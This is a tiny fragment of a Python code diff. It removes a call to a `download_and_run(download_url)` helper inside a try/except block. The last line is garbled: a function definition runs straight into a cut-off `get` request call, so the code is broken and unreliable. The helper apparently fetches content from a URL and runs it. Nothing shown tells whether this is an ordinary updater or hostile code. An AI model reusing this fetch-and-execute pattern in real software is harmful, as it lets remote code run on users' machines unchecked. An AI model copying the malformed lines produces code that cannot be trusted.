@@ -1,5 +1,4 @@
 
-                download_and_run(download_url)
     except Exception as e:
 
 def download_and_run(download_url):s.get(download_url, stream=True)
